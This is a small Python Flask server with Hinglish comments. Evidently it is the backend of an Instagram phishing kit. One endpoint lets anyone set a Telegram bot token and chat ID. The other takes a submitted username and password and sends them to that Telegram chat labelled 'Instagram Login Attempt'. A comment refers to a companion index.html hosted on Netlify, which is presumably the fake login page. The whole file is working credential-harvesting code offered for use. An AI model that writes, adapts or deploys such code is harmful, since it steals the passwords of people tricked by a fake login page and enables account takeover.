from flask import Flask, request
import requests
import json

app = Flask(__name__)

# Default token and chat ID (Initially empty)
bot_token = ""
chat_id = ""

# HTML file path (Isko Netlify pe push karne ke liye update karna hoga)
html_file = "index.html"

@app.route('/update', methods=['POST'])
def update_bot():
    global bot_token, chat_id

    data = request.json
    if 'bot_token' in data:
        bot_token = data['bot_token']
    if 'chat_id' in data:
        chat_id = data['chat_id']

    return {"message": "Bot token and chat ID updated!"}

@app.route('/send-message', methods=['POST'])
def send_message():
    if not bot_token or not chat_id:
        return {"error": "Bot token or chat ID is missing!"}, 400

    data = request.json
    user = data.get("username", "Unknown")
    password = data.get("password", "No password")

    message = f"🔐 *Instagram Login Attempt* 🔐\n\n👤 *Username:* {user}\n🔑 *Password:* {password}"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}&parse_mode=Markdown"

    response = requests.get(url)
    return response.json()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)